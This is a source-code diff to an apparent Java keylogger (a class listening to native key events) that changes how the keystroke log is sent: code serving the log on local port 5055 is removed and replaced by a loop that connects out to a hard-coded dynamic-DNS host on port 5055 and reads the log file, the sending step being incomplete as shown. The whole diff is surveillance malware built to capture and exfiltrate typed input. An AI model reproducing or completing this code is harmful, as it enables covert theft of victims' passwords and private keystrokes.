@@ -9,6 +9,7 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.ServerSocket;
 import java.net.Socket;
@@ -70,12 +71,13 @@ public class MainKey implements NativeKeyListener {
 
 
 class enviaLog extends Thread{
-	private FileInputStream fis = null;
-	private BufferedInputStream bis = null;
-	private OutputStream os = null;
-	private ServerSocket servsock = null;
-	private Socket sock = null;
-	private String path;
+
+	 private String path;	
+	 private FileInputStream fis = null;
+	 private BufferedInputStream bis = null;
+	 private OutputStream os = null;
+	 private ServerSocket servsock = null;
+	 private Socket sock = null;
 	
 	public enviaLog(String p){
 		path = p;
@@ -83,43 +85,18 @@ class enviaLog extends Thread{
 
 	public void run(){
 		
-			try {
-				
-				servsock = new ServerSocket(5055);
-				while(true){
-					sock = servsock.accept();
-					try{
-						
-						File log = new File (path);
-						byte [] bytearray  = new byte [(int)log.length()];
-						fis = new FileInputStream(log);
-						bis = new BufferedInputStream(fis);
-						bis.read(bytearray,0,bytearray.length);
-						os = sock.getOutputStream();
-						os.write(bytearray,0,bytearray.length);
-						os.flush();
-						
-					}finally{
-						
-						if (bis != null) bis.close();
-				        if (os != null) os.close();
-				        if (sock!=null) sock.close();
-						
-					}
-				}
-			} catch (IOException e) {
-				
-				
-			} finally  {
-				if (servsock != null)
-					try {
-						servsock.close();
-					} catch (IOException e) {
-						
-						e.printStackTrace();
-					}
-			}			
-	
+		try{
+			while(true){
+		      sock = new Socket("raspibjuan.redirectme.net", 5055);
+		      File log = new File (path);
+	          byte [] mybytearray  = new byte [(int)log.length()];
+	          fis = new FileInputStream(log);
+	          bis = new BufferedInputStream(fis);
+		     
+			}
+		}catch(IOException e){
+			
+		}
 	}
 
 }
